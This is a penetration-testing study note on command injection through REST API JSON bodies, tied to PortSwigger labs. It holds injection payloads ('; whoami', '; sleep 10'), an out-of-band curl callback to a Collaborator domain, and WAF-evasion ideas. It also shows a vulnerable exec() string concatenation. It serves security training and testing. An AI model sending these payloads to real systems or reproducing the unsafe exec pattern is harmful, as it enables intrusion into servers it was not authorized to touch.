# Command Injection via API Endpoints

Refer to your web-app OS command injection series for the underlying shell metacharacter
theory (`;`, `|`, `&&`, backticks, `$()`). This file covers API-specific delivery and
blind detection methodology.

## 1. Identifying Shell-Out Parameters in REST API Bodies

API endpoints that trigger server-side shell execution are usually recognizable by
functional pattern rather than parameter name alone — look for endpoints that:

- Convert or process files (PDF generation, image resizing, video transcoding) — often
  shelling out to tools like `ffmpeg`, `imagemagick`, or `pandoc`.
- Perform network diagnostics (ping/traceroute-as-a-service features) — a very common,
  almost textbook command injection pattern, since the feature's entire purpose is to
  pass a user-supplied host to a system `ping` command.
- Trigger backup, export, or archive operations — often shelling out to `tar`, `zip`, or
  database dump utilities with a user-influenced filename or path parameter.
- Interact with system-level utilities exposed as "convenience" API features (DNS lookup,
  whois, git operations).

A representative vulnerable JSON body:

```json
{
  "hostname": "example.com",
  "checkType": "ping"
}
```

If the backend does something like:

```javascript
exec(`ping -c 4 ${req.body.hostname}`)
```

Then `hostname` is directly concatenated into a shell command. Test payload:

```json
{
  "hostname": "example.com; whoami",
  "checkType": "ping"
}
```

Breakdown:

- `"example.com; whoami"` — the JSON string value contains a semicolon shell
  metacharacter. Once this string is extracted by the JSON parser (stripping the JSON
  quotes) and handed to `exec()`, the shell sees `ping -c 4 example.com; whoami` — two
  separate shell commands, since `;` is a command separator in most shells. The `ping`
  runs, then `whoami` also runs, and if the API response includes any command output
  (e.g. a diagnostics-report field), the `whoami` output may be reflected back.
- No JSON-specific escaping was needed here because `;` and spaces are all valid inside a
  JSON string without requiring backslash-escaping — this is a case where the JSON
  delivery layer adds no extra friction over a form-encoded equivalent, unlike SQLi where
  quote-escaping was a factor.

## 2. Blind Command Injection Detection

Most real-world command injection via API is **blind** — the command executes but its
output is never reflected in the API response. Two primary detection techniques:

### Time-Delay Detection

```json
{"hostname": "example.com; sleep 10"}
```

Breakdown:

- `sleep 10` — a shell command that does nothing except pause execution for 10 seconds.
- If the API response is measurably delayed by ~10 seconds compared to a baseline request
  with a clean `hostname` value, that's strong evidence the injected command actually
  executed server-side, even though nothing was reflected in the response body.
- **API-specific consideration**: API endpoints often have gateway-level or reverse-proxy
  timeout settings (commonly 30s, sometimes as low as 5-10s) that can truncate the
  response before your delay completes, producing a timeout/502 error that looks like a
  failure but is actually a *positive* signal (the command did trigger a delay, just one
  longer than the gateway would wait for). Always test with progressively increasing
  delay values (2s, 5s, 10s) and treat an unexpected 502/504 as inconclusive-but-
  suspicious rather than a hard negative, then corroborate with the OOB method below.
- **Async/queued API consideration**: some APIs process requests via a background job
  queue and return an immediate "202 Accepted" regardless of what happens downstream in
  the actual worker process — time-delay detection is unreliable against this pattern
  since the HTTP response was never waiting on the command's completion in the first
  place. OOB detection (below) is the correct primary technique for these architectures.

### Out-of-Band (OOB) Detection

```json
{"hostname": "example.com; curl http://your-oob-domain.burpcollaborator.net/cmdi-test"}
```

Breakdown:

- `curl http://your-oob-domain.../cmdi-test` — instructs the shell to make an outbound
  HTTP request to a domain you control (Burp Collaborator or an equivalent OOB
  interaction service). If that domain receives a DNS lookup and/or HTTP request shortly
  after you send the API request, that's direct, unambiguous proof of command execution —
  no timing ambiguity, no dependency on the API's response timeout behavior.
- OOB is the **preferred primary technique for API contexts specifically**, because it
  sidesteps both the gateway-timeout problem and the async-job-queue problem described
  above — the callback happens independently of whatever the HTTP response does.
  Burp Collaborator's client polls for interactions, so you can fire the payload and
  check for a hit minutes later even if the API gave an immediate generic response.
- For network-restricted/internal APIs where the target server has no outbound internet
  access (common in tightly-segmented microservice environments), OOB detection via
  public Collaborator infrastructure won't work — in that scenario, fall back to
  time-delay detection, or (with explicit authorization) DNS-based OOB against an
  internally-reachable listener if one can be set up within the engagement's scope.

## 3. WAF/Gateway Note for Command Injection via API

Relevant. Generic WAF rule sets commonly signature-match shell metacharacters (`;`, `|`,
`` ` ``, `$(`) as substrings — the same JSON-normalization question from the overview file
applies: whether the WAF scans the raw body bytes (JSON-escaping-aware) or scans after
JSON parsing (raw string value) determines whether Unicode-escaping the metacharacter
(e.g. representing `;` differently, or using alternate shell separators the signature
list doesn't cover, like newline `\n` in shells that accept it as a separator) evades
detection. Full technique breakdown in `06-waf-bypass-api-injection.md`.

## 4. PortSwigger Lab Mapping (Adapted for API Context)

- **Apprentice**: "OS command injection, simple case" — convert the vulnerable form field
  to a JSON body value and reproduce; a direct, low-friction conversion since (as shown
  above) command injection payloads generally don't require JSON-escaping changes.
- **Practitioner**: "Blind OS command injection with time delays" — maps directly to the
  time-delay section above; practice constructing the `sleep`-based payload as a JSON
  string value and measuring response timing through Burp Repeater's response time
  display.
- **Practitioner**: "Blind OS command injection with output redirection" — the underlying
  technique (redirecting command output to a location you can later retrieve) transfers
  directly; when adapting to API context, consider whether the API has any file-serving
  endpoint you could redirect output to and later fetch via a separate GET request.
- **Practitioner**: "Blind OS command injection with out-of-band interaction" — maps
  directly to the OOB section above; this is the most directly transferable lab to the
  API context since OOB detection doesn't depend on response-reflection at all.
- **Practitioner**: "Blind OS command injection with out-of-band data exfiltration" —
  extends OOB detection to actually exfiltrate command output via DNS/HTTP requests
  encoding the data, directly applicable once basic OOB detection is confirmed.

No Expert-tier command injection lab currently exists on the Academy as of this writing —
noted here for honest gap disclosure rather than omitted silently.

## Real-World Note

Command injection via API is disproportionately found in "convenience" internal tooling
APIs — network diagnostics, file conversion microservices, and CI/CD pipeline trigger
endpoints — because these are often built quickly by teams who don't think of them as
security-sensitive attack surface ("it's just an internal ping tool"), and because they
frequently run with elevated service-account permissions on the host, making successful
command injection here a high-impact finding even when the endpoint itself seemed
low-value at first glance.
